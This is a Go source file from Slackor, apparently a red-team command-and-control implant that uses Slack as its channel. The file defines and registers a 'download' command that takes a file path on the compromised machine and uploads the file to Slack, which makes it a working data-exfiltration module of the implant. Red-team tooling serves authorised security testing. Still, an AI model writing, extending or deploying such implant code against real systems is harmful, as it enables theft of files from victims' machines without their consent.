package common

import (
	"errors"
	"fmt"
	"path/filepath"

	"github.com/Coalfire-Research/Slackor/internal/slack"
	"github.com/Coalfire-Research/Slackor/pkg/command"
)

// Download sends the file to Slack
type Download struct{}

// Name is the name of the command
func (d Download) Name() string {
	return "download"
}

// Run sends the file to Slack
func (d Download) Run(clientID string, jobID string, args []string) (string, error) {
	if len(args) != 1 {
		return "", errors.New("download takes 1 argument")
	}
	path := filepath.Clean(args[0])
	// The download command uploads files to Slack
	// Command is named from the perspective of the remote system
	slack.Upload(clientID, jobID, path)
	return fmt.Sprintf("Downloaded %s", path), nil
}

func init() {
	command.RegisterCommand(Download{})
}
